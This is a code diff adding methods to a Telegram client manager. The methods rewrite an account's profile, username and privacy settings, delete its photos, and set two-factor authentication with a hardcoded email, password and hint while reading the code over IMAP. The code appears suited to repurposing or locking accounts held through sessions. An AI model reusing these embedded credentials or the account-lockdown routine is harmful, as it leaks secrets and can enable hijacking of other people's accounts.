@@ -1,6 +1,6 @@
 import { TelegramClient } from 'telegram';
 import { StringSession } from 'telegram/sessions';
-import { NewMessage, NewMessageEvent } from 'telegram/events';
+import { NewMessage } from 'telegram/events';
 import { Api } from 'telegram/tl';
 import axios from 'axios';
 import * as fs from 'fs';
@@ -9,9 +9,10 @@ import mongoose from 'mongoose';
 import { ActiveChannelsService } from '../activechannels/activechannels.service';
 import { ActiveChannel, ActiveChannelSchema } from '../activechannels/schemas/active-channel.schema';
 import { contains, parseError } from '../../../utils';
-import { TotalList } from 'telegram/Helpers';
+import { TotalList, sleep } from 'telegram/Helpers';
 import { Dialog } from 'telegram/tl/custom/dialog';
 import { LogLevel } from 'telegram/extensions/Logger';
+import { MailReader } from '../../IMap/IMap';
 
 class TelegramManager {
     private session: StringSession;
@@ -39,9 +40,8 @@ class TelegramManager {
 
     async getchatId(username: string): Promise<any> {
         if (!this.client) throw new Error('Client is not initialized');
-        const tt = await this.client.getInputEntity(username);
-        console.log(tt);
-        return tt;
+        const entity = await this.client.getInputEntity(username);
+        return entity;
     }
 
     async createClient(handler = true): Promise<TelegramClient> {
@@ -63,11 +63,11 @@ class TelegramManager {
         }
     }
 
-    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8) : Promise<TotalList<Api.Message>>{
+    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {
         const messages = await this.client.getMessages(entityLike, { limit });
         return messages;
     }
-    async getDialogs(): Promise<TotalList<Dialog>>{
+    async getDialogs(): Promise<TotalList<Dialog>> {
         const chats = await this.client.getDialogs({ limit: 500 });
         console.log("TotalChats:", chats.total);
         return chats
@@ -261,6 +261,169 @@ class TelegramManager {
         }
     }
 
+    async updatePrivacyforDeletedAccount() {
+        try {
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneCall(),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Calls Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyProfilePhoto(),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("PP Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneNumber(),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Number Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyStatusTimestamp(),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyAbout(),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("LAstSeen Updated")
+        }
+        catch (e) {
+            throw e
+        }
+    }
+    async updateProfile(firstName, about) {
+        try {
+            const result = await this.client.invoke(
+                new Api.account.UpdateProfile({
+                    firstName: firstName,
+                    lastName: "",
+                    about: about,
+                })
+            );
+            console.log("Updated NAme: ", firstName);
+        } catch (error) {
+            throw error
+        }
+    }
+    async updateUsername(baseUsername) {
+        let newUserName = ''
+        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
+        let increment = 0;
+        if (username === '') {
+            try {
+                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
+                console.log(`Removed Username successfully.`);
+            } catch (error) {
+                throw error
+            }
+        } else {
+            while (true) {
+                try {
+                    const result = await this.client.invoke(
+                        new Api.account.CheckUsername({ username })
+                    );
+                    console.log(result, " - ", username)
+                    if (result) {
+                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
+                        console.log(`Username '${username}' updated successfully.`);
+                        newUserName = username
+                        break;
+                    } else {
+                        username = baseUsername + increment;
+                        increment++;
+                        await sleep(4000);
+                    }
+                } catch (error) {
+                    console.log(error.message)
+                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
+                        newUserName = username;
+                        break;
+                    }
+                    username = baseUsername + increment;
+                    increment++;
+                }
+            }
+        }
+        return newUserName;
+    }
+
+    async updatePrivacy() {
+        try {
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneCall(),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Calls Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyProfilePhoto(),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("PP Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneNumber(),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Number Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyStatusTimestamp(),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("LAstSeen Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyAbout(),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+        }
+        catch (e) {
+            throw e
+        }
+    }
     async getFileUrl(url: string, filename: string): Promise<string> {
         const response = await axios.get(url, { responseType: 'stream' });
         const filePath = `/tmp/${filename}`;
@@ -273,6 +436,69 @@ class TelegramManager {
         return filePath;
     }
 
+    async updateProfilePic(image) {
+        try {
+            const file = await this.client.uploadFile({
+                file: new CustomFile(
+                    'pic.jpg',
+                    fs.statSync(
+                        image
+                    ).size,
+                    image
+                ),
+                workers: 1,
+            });
+            console.log("file uploaded- ", file)
+            await this.client.invoke(new Api.photos.UploadProfilePhoto({
+                file: file,
+            }));
+            console.log("profile pic updated")
+        } catch (error) {
+            throw error
+        }
+    }
+
+    async set2fa() {
+        const imapService = MailReader.getInstance();
+        imapService.connectToMail();
+        const intervalParentId = setInterval(async () => {
+            const isReady = imapService.isMailReady();
+            if (isReady) {
+                clearInterval(intervalParentId);
+                await this.client.updateTwoFaSettings({
+                    isCheckPassword: false,
+                    email: "storeslaksmi@gmail.com",
+                    hint: "password - India143",
+                    newPassword: "Ajtdmwajt1@",
+                    emailCodeCallback: async (length) => {
+                        console.log("code sent");
+                        return new Promise(async (resolve) => {
+                            let retry = 0
+                            const intervalId = setInterval(async () => {
+                                console.log("checking code");
+                                retry++
+                                const isReady = imapService.isMailReady();
+                                if (isReady && retry < 4) {
+                                    const code = await imapService.getCode();
+                                    if (code !== '') {
+                                        clearInterval(intervalId);
+                                        imapService.disconnectFromMail()
+                                        resolve(code);
+                                    }
+                                } else {
+                                    clearInterval(intervalId);
+                                    await this.client.disconnect();
+                                    imapService.disconnectFromMail()
+                                    resolve(undefined);
+                                }
+                            }, 6000);
+                        });
+                    },
+                    onEmailCodeError: (e) => { console.log(parseError(e)); return Promise.resolve("error") }
+                })
+            }
+        }, 5000);
+    }
     async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
         if (!this.client) throw new Error('Client is not initialized');
         const filePath = await this.getFileUrl(url, filename);
@@ -285,6 +511,26 @@ class TelegramManager {
         const filePath = await this.getFileUrl(url, filename);
         const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
         await this.client.sendFile(id, { file, caption });
+    }
+
+    async deleteProfilePhotos() {
+        try {
+            const result = await this.client.invoke(
+                new Api.photos.GetUserPhotos({
+                    userId: "me"
+                })
+            );
+            console.log(result)
+            if (result && result.photos?.length > 0) {
+                const res = await this.client.invoke(
+                    new Api.photos.DeletePhotos({
+                        id: <Api.TypeInputPhoto[]><unknown>result.photos
+                    }))
+            }
+            console.log("Deleted profile Photos");
+        } catch (error) {
+            throw error
+        }
     }
 }
 export default TelegramManager;
